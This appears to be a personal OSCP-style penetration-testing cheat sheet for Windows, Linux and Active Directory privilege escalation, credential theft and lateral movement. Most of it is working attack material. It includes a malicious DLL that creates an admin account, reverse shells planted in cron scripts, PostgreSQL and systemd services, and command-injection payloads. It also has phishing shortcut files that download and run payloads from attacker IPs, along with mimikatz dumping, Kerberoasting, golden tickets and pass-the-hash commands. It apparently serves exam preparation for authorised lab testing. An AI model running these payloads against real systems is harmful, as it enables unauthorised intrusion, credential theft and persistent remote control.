//BUILTIN\Users:(CI)(S,WD,AD)
icacls "C:\Skylark\Development Binaries 01" 
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """  #cmd
copy C:\Users\Public\rs.exe Development.exe
Start-Service DevService 
Stop-Service DevService 

//powerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
//john
net user 
net localgroup administrators
```

### Service DLL Hijacking

```jsx
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

//check log file to find lacked dll
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\Documents\BetaServ.exe
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
//i686-w64-mingw32-gcc for 32bit dll
Restart-Service BetaService
net localgroup administrators
```

Add user

```jsx
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
  	    //i = system ("C:\Services\nc.exe 192.168.45.201 4444 -e powershell");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

### OS Command Injection

Directly try reverse shell

```jsx
conf> write_config 123'; powershell -c C:\Users\Public\rs.exe; '123

{
	"user":"clumsyadmin", 
	"url":"http://192.168.1.1/rs.elf; nc 192.168.1.1 4444 -e /bin/bash"
} 
```

### Interesting file

History

```jsx
Get-History
(Get-PSReadlineOption).HistorySavePath
```

.git

```php
Get-ChildItem -Path C:\ -Recurse -Force -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq '.git' } | Select-Object FullName
```

.kdbx

```jsx
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/fasttrack.txt  keepass.hash
keepassxc Database.kdbx
```

user folder

```jsx
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
tree /f C:\Users\

\Desktop
\Document
C:\
```

Windows.old

```jsx
C:\windows.old\Windows\system32\
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM .
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM .
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
secretsdump.py -sam SAM -security security -system SYSTEM LOCAL
```

### Privilege

SeImpersonate

```jsx
whoami /priv

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.18.1 LPORT=4444 EXITFUNC=thread -f exe --platform windows -o rs.exe

.\JuicyPotatoNG.exe -t * -p rs.exe

//Windows 10 and Server 2016/2019

If spooler service is stopped, printspoofer.exe will not work
PS C:\Services> get-service | findstr -i "spooler"
get-service | findstr -i "spooler"
Stopped  Spooler            Print Spooler  

.\PrintSpoofer64.exe -c rs.exe

//Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version
.\GodPotato.exe -cmd "cmd /c rs.exe"

```

SeBackupPrivilege

```jsx
//may also works when Privilege enabled / presented but disabled
robocopy /b C:\Users\enterpriseadmin\Desktop\ .\stolen
```

SeRestorePrivilege

```jsx
rename-item C:\Windows\system32\utilman.exe C:\Windows\system32\utilman.old
rename-item C:\Windows\system32\cmd.exe C:\Windows\system32\utilman.exe

rdesktop 192.168.15.1
WIN + U
```

### Switch User

```powershell
runas  /user:backupadmin cmd  #require GUI

https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\transfer\rs.exe"
.\RunasCs.exe thecybergeek winniethepooh "whoami" --bypass-uac --logon-type '5'

$password = ConvertTo-SecureString "password!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
whoami

impacket-psexec vector/administrator@192.168.1.1
```

### Credentials

> https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#files-and-registry-credentials
> 

```jsx
findstr /si password *.txt
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /spin "password" *.*

//command line history
(Get-PSReadlineOption).HistorySavePath
//putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

. .\LaZagne.exe all

. .\sessionGopher.ps1
Invoke-SessionGopher -Thorough

cmdkey /list

*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM .
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM .

Try ssh/psexec/wmiexec/rdp

```

### Local web runas Admin/System

GET reuqest

```jsx
curl http://fake #cmd
Invoke-WebRequest -UseBasicParsing -Uri http://example.com/ #powershell
```

## **Linux**


### AutoScan

```jsx
bash linpeas.sh > out.txt
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
cat out.txt | less -r
```

### Switch User

password reuse

```jsx
su root
any password you can find
```

username reuse

```jsx
su patricks
patricks
```

### Kernel Version

Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)

Fixed:`5.16.11, 5.15.25, 5.10.102`

```jsx
https://github.com/Al1ex/CVE-2022-0847
```

### Scheduled Tasks / Cron

```php
cat /etc/crontab
ls /etc/cron.*
grep "CRON" /var/log/syslog

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.1 1234 >/tmp/f" >> user_backups.sh
```

### Hidden Cron

```jsx
./pspy6 
timeout 60s pspy32s


verify directory permission (r/w)
re-run commands to test root permission
```

**Tar** `—checkpoint-action` arbitrary command execution.

> https://www.exploit-db.com/papers/33930
> 

```jsx
//CMD: UID=0     PID=32358  | /bin/bash -c cd /opt/admin && tar -zxf /tmp/backup.tar.gz * 
dave@fake:/opt/admin$ echo "/bin/bash -i >& /dev/tcp/192.168.1.1/8080 0>&1" > shell.sh
dave@fake:/opt/admin$ echo > "--checkpoint-action=exec=bash shell.sh"
dave@fake:/opt/admin$ echo > "--checkpoint=1"
```

Directly Executing bash file (writable)

```jsx
//CMD: UID=0     PID=2309   | /bin/bash /opt/log-backup.sh 
//CMD: UID=0     PID=2311   | tar -czf /root/backup/log_backup_20240624204301.tar.gz /root/backup/log_backup_20240624204301  
echo "/bin/bash -i >& /dev/tcp/192.168.1.1/8080 0>&1" >> /opt/log-backup.sh 

#.sh need to start with #!/bin/bash
```

### Sudo

Sudo List

```jsx
sudo -l
https://gtfobins.github.io/

//check user group
cat /etc/groups
//ALL:ALL NOPASS
sudo su
sudo -i

//(ALL) NOPASSWD: /usr/bin/psql
https://gtfobins.github.io/gtfobins/psql/#sudo

//(ALL) NOPASSWD: /usr/bin/ruby /home/dave/app/app.rb
echo 'exec "/bin/bash"' > app.rb
sudo /usr/bin/ruby /home/dave/app/app.rb

ls -l /etc/sudoers

//(ALL : ALL) ALL
//(root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita * => * means any behavior
sudo composer --working-dir=$TF run-script x
```

Sudo Version

```jsx
sudo -V
https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
```

Sudo Group Privilege

```jsx
//switch to skunk
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                            
uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
```

### SUID

> https://gtfobins.github.io/
> 

```jsx
find / -perm -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
//some suid binary
-rwsr-xr-x  1 root  wheel    29K Oct  6  2022 /usr/local/bin/doas
```

check process permission

```jsx
ps u -C passwd
grep Uid /proc/1932/status
```

binaries

```jsx
#dosbox
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo Sarge ALL=(root) NOPASSWD: ALL >> c:$LFILE" -c exit
```

### Capabilities

setuid

```jsx
/usr/sbin/getcap -r / 2>/dev/null

/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/python3.10 cap_setuid=ep
```

### Misconfigured access

Restart service

```jsx
/usr/local/www/apache24/data/phpMyAdmin/tmp
/usr/local/bin/doas service apache24 onestart #if doas is suid binary
```

Write to /etc/passwd

```jsx
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2

//pass root2
 -c "echo root2:\$1\$IdiABLmH\$mD1mSZbPztSmvht.AbtkN.:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Write to suders

```jsx
echo "<username> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers #fill out username
```

### Writable Path

```jsx
/tmp/
/dev/shm/
/var/tmp/
```

### Environment variables

```jsx
AppKey:passw0rd!
```

add path to PATH

```jsx
export PATH=$PATH:/opt/aerospike/bin/asadm
```

### Interesting file

```jsx
history
.bash_history
.bash_aliases
/var/www/html/
/home
/var/lib
/var/db
/opt
/tmp
/etc/exports
```

### PostgreSQL

Basic commands

```jsx

psql --host=127.0.0.1 -U postgres
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles
# SELECT current_setting('is_superuser');
```

RCE

```jsx
//Postgres version 9.3+,super user RCE
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
//COPY cmd_exec FROM PROGRAM '/bin/sh -i >& /dev/tcp/192.168.45.201/80 0>&1';
//COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.1 80 >/tmp/f';
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.1:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

### MySQL

RCE via malicious plugin

```jsx
//locate mysql privilege escalation library in kali
locate "*lib_mysqludf_sys*"

//upload to plugin folder and load
show variables like '%plugin%';
create function sys_exec returns string soname 'lib_mysqludf_sys.so';
SELECT sys_exec("net user dave Dave123 /add");
SELECT sys_exec("net localgroup Administrators dave /add");
```

RCE via administrator privilege (read&write)

```jsx
//check read permission
select load_file('C:\\\\Users\\Administrator\\Desktop\\proof.txt');

```

Password Reuse

```jsx
mysql -u dave2 -pPassw0rd!
mysql -u root -pPassw0rd!
```

Credentials

```jsx
table_name like customers
```

### .Service

escalate privilege after reboot

```jsx
//modify file via vi
vi /etc/systemd/system/pythonapp.service

[Service]
ExecStart=nc 192.168.1.1 80 -e /bin/bash
User=root
```

### Inside container

```jsx
//linpeas.sh                                                                                                                        
═╣ Is this a container? ........... docker  
```

# AD

### Methodology

```jsx
initial access:
1.rce
2.passwd
3.authenticated hash

normal account
1.AS-REP Roasting
2.Kerberoasting
3.history

admin account
1.mimikatz
2.history
3.Bloodhound

Once you have a username:password pair, you can try following commands from kali:
1. nxc smb/wmi/rdp/winrm (NOTE: password reuse)
2. GetADUsers.py
3. AS-REP Roasting
4. Kerberoasting
5. bloodhound-python
```

### Users/groups

```jsx
net user //confirm local user
net user /domain //confirm domain user
net user name /domain
net group /domain
net group name /domain
whoami /all
```

### BloodHound

```jsx
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\ 

sudo apt install bloodhound.py
bloodhound-python -u dave -p passw0rd -d fake.com -c All -ns 192.168.1.1
```

customized query

```jsx
#find all computers in domain
MATCH (m:Computer) RETURN m
#find all users in domain
MATCH (m:User) RETURN m
#sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

check

```jsx
//generic all
node info => Outbound object control => transitive object control

Analysis => Shortest Paths => Shortest Paths to Domain Admins
```

### Object Permissions

`Generic All` on fakedDC.faked.local (computer) ⇒ resource-based constrained delegation attack

```jsx
.\StandIn45.exe --computer xct --make //create new computer

[?] Using DC    : fakeDC.faked.local
    |_ Domain   : faked.local
    |_ DN       : CN=xct,CN=Computers,DC=faked,DC=local
    |_ Password : jZHKk2l8l9D9buy


Get-ADComputer -Filter * | Select-Object Name,SID //get old computer name

Name       SID
----       ---
FAKEDC S-1-5-21-537427935-490066102-1511301751-1000
xct        S-1-5-21-537427935-490066102-1511301751-4101


.\StandIn45.exe --computer FakeDC --sid S-1-5-21-537427935-490066102-1511301751-4101 //msDS-AllowedToActOnBehalfOfOtherIdentity
.\Rubeus.exe hash /password:pasSw0rd123 //rc4
.\Rubeus.exe s4u /user:xct /rc4:CB1CCB1CCB1CCB1CCB1CCB1CCB1C /impersonateuser:administrator /msdsspn:cifs/fakedc.faked.local /nowrap /ptt //create ticket

//cifs => login via psexec
mousepad ticket.b64 #copy new ticket to kali
cat ticket.b64| base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=`pwd`/ticket.ccache
klist #sudo apt-get install krb5-user
sudo sh -c 'echo "192.168.1.1 fakedc.faked.local" >> /etc/hosts'
sudo impacket-psexec -k -no-pass faked.local/Administrator@fakedc.faked.local -dc-ip 192.168.180.175

```

`ReadLAPSPassword` 

```jsx
//local admin password
nxc ldap 192.168.1.1 -u "dave2"  -p "password" -M laps 
```

### Port Forward

ligolo-ng

```jsx
sudo ip route add 240.0.0.1/32 dev ligolo
```

SSH

```jsx
//on local (kali)
ssh -N -L 0.0.0.0:8000:127.0.0.1:8000 dave@192.168.227.246 -p 2222 -i id_ecdsa

//on remote machine
ssh -N -R 127.0.0.1:443:127.0.0.1:631 kali@192.168.45.1
ssh -N -R 9998 kali@192.168.118.1
```

proxychains

```jsx
/etc/proxychains4.conf
socks 127.0.0.1 9998
proxychains psql -h 10.4.1.1 -U postgres 
```

### PowerView.ps1

```jsx
powershell -ep bypass
Import-Module .\PowerView.ps1

Get-NetDomain
Get-NetUser | select cn,pwdlastset,lastlogon
Get-DomainUser | select cn
Get-NetGroup | select name

Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Find-LocalAdminAccess
Find-DomainShare -CheckShareAccess

Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "alice"}

//check genericAll => bloodhound
Get-ObjectAcl -Identity "Domain Users" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
net group "Management Department" dave /add /domain

//Group Policy
Get-GPO -Name "Default Domain Policy"
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName dave
//Permission  : GpoEditDeleteModifySecurity
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount dave --GPOName "Default Domain Policy"
gpupdate /force
```

### Password

prepare for dictionary

```jsx
//219 => 216
sed -i 's/219/216/g' machine.txt
```

Spray password

```jsx
nxc  smb machines.txt -u user.txt -p pass.txt
nxc  smb 172.16.1.1 -u 'user' -p 'pass' --shares
nxc  smb 172.16.1.1 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
nxc winrm 192.168.1.1  -u user.txt -H crack --no-bruteforce --continue-on-success

//non domain user
nxc winrm 10.10.111.1 -u user.txt -p pass -d Target2

impacket-psexec dave@172.16.1.1
//specify domain name for administrator
impacket-psexec fake.com/Administrator:"pass\$"@172.16.1.1
impacket-wmiexec fake.com/Administrator:"pass\!0rd\$"@172.16.1.1

//port 135
nxc wmi 172.16.1.1 -u user.txt -p pass.txt
impacket-wmiexec fake.com/Administrator:"pass\!0rd\$"@172.16.1.1
```

### NTLM Hash

Spary NTLM hash

```jsx
//test smb(139,445),wmi(135),rdp(3389),winrm(5985)
nxc smb 10.10.1.1 -u bob.alice -H e728ecbbbbbbbbbbbbbb
//spray local
nxc winrm 10.10.1.1 -u user.txt -p passW0rd -d Target2
evil-winrm -i 10.10.1.1 -u bob.alice -H e728ecbbbbbbbbbbbbbb
xfreerdp /v:192.168.1.1 /u:fake.com/dave /pth:19b219b219b219b219b2 +clipboard +drive:share,/tmp
```

Passing NTLM

```jsx
smbclient \\\\192.168.1.1\\secrets -U Administrator --pw-nt-hash e728ecbbbbbbbbbbbbbb

//specify domain name for administrator
impacket-psexec -hashes :e728ecbbbbbbbbbbbbbb skylark.com/Administrator@10.10.1.1
impacket-wmiexec -hashes :e728ecbbbbbbbbbbbbbb skylark.com/Administrator@10.10.1.1

evil-winrm -i 10.10.1.1 -u bob.alice -H e728ecbbbbbbbbbbbbbb
```

Dump

```jsx
privilege::debug
sekurlsa::logonpasswords
token::elevate
lsadump::lsa /inject
lsadump::lsa /patch
lsadump::sam
lsadump::secrets
lsadump::trust

 .\mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 "token::elevate" "lsadump::sam"
 
 //require local admin
impacket-secretsdump Target2/Administrator:password@10.10.1.1
 
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
secretsdump.py fake.com/Administrator:password@192.168.1.1

//local administrator password
nxc ldap 192.168.1.1 -u "dave"  -p "password" -M laps 
```

Crack hash

```jsx
//md5 or short one
https://crackstation.net/

//ntlm
hashcat -m 1000 dave.hash /usr/share/wordlists/rockyou.txt --force
//ntlmv2
hashcat -m 5600 dave.hash /usr/share/wordlists/rockyou.txt --force
```

NTLMv2 authentication

```jsx
sudo responder -I tun0
dir \\192.168.1.1\test
hashcat -m 5600 dave.hash /usr/share/wordlists/rockyou.txt --force
```

NTLMv2 Relay

```jsx
dir \\192.168.1.1\test
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.1.1 -c 'powershell -e JABjAGwAaQBlA'
```

### GetADUsers

reuqested username should be domain user

```jsx
Get-NetUser | select samaccountname //powerview
net user /domain
impacket-GetADUsers -all -dc-ip 10.10.1.1 fake.com/bob.alice -hashes :e72dddddddddddddd | awk '{print $1}'
GetADUsers.py -all -dc-ip 192.168.1.1 fake.com/dave:password
```

### AS-REP Roasting

```php
.\Rubeus.exe asreproast /nowrap

impacket-GetNPUsers -dc-ip 192.168.1.1  -request -outputfile hashes.asreproast corp.com/dave

nxc ldap 192.168.1.1 -u "dave"  -p "password" --asreproast hash

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Kerberoasting

service runas normal user

```jsx
sudo impacket-GetUserSPNs -request -dc-ip 192.168.1.1 corp.com/dave
sudo impacket-GetUserSPNs fake.com/bob.alice -hashes :e728ecbadfb02f51ce8eed753f3ff3fd -request -dc-ip 10.10.185.140 -outputfile hashes.asreproast
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force

nxc ldap 192.168.1.1 -u "dave"  -p "password" --kerberoasting hash

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

### Silver Tickets

```jsx
//iis_server NTLM => rc4 
sekurlsa::logonpasswords
//SID [-4:]
whoami /user
klist
//inject ticket
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:fake.com /ptt /target:web01.fake.com /service:http /rc4:rc4rc4rc4rc4rc4rc4rc4rc4 /user:dave
iwr -UseDefaultCredentials http://web01

Rubeus.exe silver /service:MSSQKSvc/dc1.fake.local:1433 /rc4:rc4rc4rc4rc4rc4rc4rc4rc4 /sid:S-1-5-21-1987370270-658905905-1781884369 /user:administrator /domain:fake.local /ptt
sqlcmd -S dc1.fake.local
```

### DCSync Attack

```jsx
**//domain admin => dc**
//get dave's ntlm when current account is domain admin group
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\administrator

hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

impacket-secretsdump -just-dc-user dave fake.com/bob:"password\!"@192.168.1.1
```

### Lateral Movement

Access

```jsx
winrs -r:files04 -u:dave -p:Password123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAA...
./PsExec64.exe -i  \\FILES04 -u fake\dave -p Password123! cmd
```

Overpass the hash

```jsx
sekurlsa::logonpasswords
sekurlsa::pth /user:dave /domain:fake.com /ntlm:3d9d3d9d3d9d3d9d3d9d3d9d3d9d /run:powershell
klist
net use \\file04
klist
.\PsExec.exe \\files04 cmd
```

Pass the Ticket

```jsx
sekurlsa::tickets /export
dir *.kirbi
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
klist
ls \\web04\backup
```

DCOM

```jsx
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4","7")
```

### Golden Ticket

```jsx
//mimikatz  - get NTLM of krbtgt and sid
lsadump::lsa /patch
//clean ticket
kerberos::purge
kerberos::golden /user:dave /domain:fake.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:3d9d3d9d3d9d3d9d3d9d3d9d3d9d /ptt
misc::cmd
//access
PsExec.exe \\dc1 cmd.exe
```

### Phishing

search for possible pdf file for email account (exiftool)

```jsx
.
├── body.txt
├── config.Library-ms
├── powercat.ps1
└── webdav
    └── powershell.lnk

//powershell.link
powershell.exe -c "iwr -uri <http://192.168.45.208:8888/supershell/compile/download/rs.exe> -Outfile C:\\Users\\Public\\test_6.exe ; C:\\Users\\Public\\test_6.exe"
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.219:8001/powercat.ps1'); powercat -c 192.168.45.219 -p 4444 -e powershell"

//config.Library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url><http://192.168.45.208></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>s
</libraryDescription>

wsgidav --port=80 --host=0.0.0.0 --root=/home/kali/Desktop/tools/phishing/webdav --auth=anonymous

//exploit1:sending phishing email
sudo swaks -t dave@fake.com --from mailadmin@fake.com --attach @config.Library-ms --server 192.168.10.1 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: 
Password: 

//exploit2:simulating clicking from share
smbclient //192.168.50.1/share -c 'put config.Library-ms'
```

# Credentials


```jsx
If you find a username, try username:username or password:password eg. admin:admin or root:root
If the first letter of username is upppercase, try lowercase.
If the first letter of username is lowercase, try uppercase.
If the first letter of password is upppercase, try lowercase, vice versa.
user.txt
pass.txt
Try every possible username found in files
search default credentials 
search current user history 
password reuse
windows.old => sam/system
spary credentials on all possible open service
for AD: spray password as local and domain
cat xxx.php.bak
commented lines in web applications
- wordpress : wp-config.php
- Werkzeug : app.py
```

# Checklist


### Foothold

```jsx
nmap tcp/udp
url scan
ftp/smb anonymouse login
login panel weak password
web framework exploit
try more 
```

### Privilege Escalation

linux

```jsx
sudo list
suid
scheduled task
pspy
linpeas
linEnum
```

windows

```jsx
impersonate
local service
.git
interesting directory
credentials => LaZagne/sessionGopher
powerUp => Invoke-AllChecksbinary => replacement / unquoted service
windows.old
winpeas
bloodhound #AD
```

### AD

Post-Exploitation

```jsx
winpeas(admin)
mimikatz
interesting file (.kdbx windows.old history)
```

Pivot

```jsx
ligolo-ng
spray password/hash to every service as local/domain
```

# Other stuff

---

## Python versions

```jsx
https://www.kali.org/docs/general-use/using-eol-python-versions/
pyenv install 2.7.1
pyenv global 2.7.18
pyenv versions
exec $SHELL
python
```

## Exam

```jsx
post the ULR of the script you use
post modified contents
screenshots: whoami; type proof.txt; ipconfig
OSCP-OS-XXXXX-Exam-Report.7z
OSCP-OS-XXXXX-Exam-Report.pdf

whoami;type proof.txt;hostname;ipconfig
hostname & whoami & type C:\Users\Administrator\Desktop\proof.txt & ipconfig #cmd
```

## Tools

[https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)

[https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md)

[https://github.com/tdragon6/Supershell](https://github.com/tdragon6/Supershell/blob/main/README_EN.md)

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

[https://www.wappalyzer.com/apps/](https://www.wappalyzer.com/apps/)

[https://github.com/maaaaz/impacket-examples-windows](https://github.com/maaaaz/impacket-examples-windows)

[https://www.kali.org/tools/impacket-scripts/](https://www.kali.org/tools/impacket-scripts/)

[https://www.kali.org/tools/impacket/](https://www.kali.org/tools/impacket/)

[https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

[https://www.kali.org/tools/gobuster/](https://www.kali.org/tools/gobuster/)

[https://www.kali.org/tools/bloodhound/](https://www.kali.org/tools/bloodhound/)

[https://github.com/epi052/feroxbuster](https://github.com/epi052/feroxbuster)

[https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

[https://github.com/fortra/impacket](https://github.com/fortra/impacket)

[https://github.com/tldr-pages/tldr](https://github.com/tldr-pages/tldr)

[https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

[https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)

[https://github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)

[https://github.com/Tib3rius/AutoRecon](https://github.com/Tib3rius/AutoRecon)

[https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

## TroubleShooting

### Impacket

Impacket tools doesn’t function right

```jsx
git clone https://github.com/fortra/impacket
python3 -m pip install .
```

### Linpeass / Winpeass

if binary version of linpeass/winpeass doesn’t work right, try to use .sh/.bat instead.

### Postgresql

Postgresql connection error (incompatible with openssl 3.2): purge and reinstall

```jsx

psql: error: connection to server at "192.168.165.10", port 5437 failed: FATAL:  no PostgreSQL user name specified in startup packet
connection to server at "192.168.165.10", port 5437 failed: FATAL:  no PostgreSQL user name specified in startup packet
double free or corruption (out)
zsh: IOT instruction  psql -h 192.168.165.10 -U postgres -p 5437 -d postgres

sudo apt-get purge postgresql 'postgresql-*' -y
sudo apt-get install postgresql-16
```